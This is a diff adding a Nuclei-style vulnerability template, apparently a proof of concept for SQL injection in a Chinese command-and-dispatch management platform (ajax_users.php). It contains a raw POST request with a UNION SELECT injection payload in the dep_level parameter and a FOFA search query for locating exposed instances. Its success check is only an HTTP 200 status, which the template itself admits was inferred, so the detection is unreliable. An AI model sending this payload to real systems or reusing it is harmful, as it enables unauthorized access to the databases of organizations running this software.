@@ -1,0 +1,29 @@
+id: poc-yhpl37cc3pv26tgr
+info:
+  name: 福建科立讯通信指挥调度管理平台ajax_users.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yhpl37cc3pv26tgr
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yhpl37cc3pv26tgr
+    fofa: body="指挥调度管理平台"
+http:
+- raw:
+  - 'POST /app/ext/ajax_users.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+
+    Content-Type: application/x-www-form-urlencoded
+
+    dep_level=1'') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
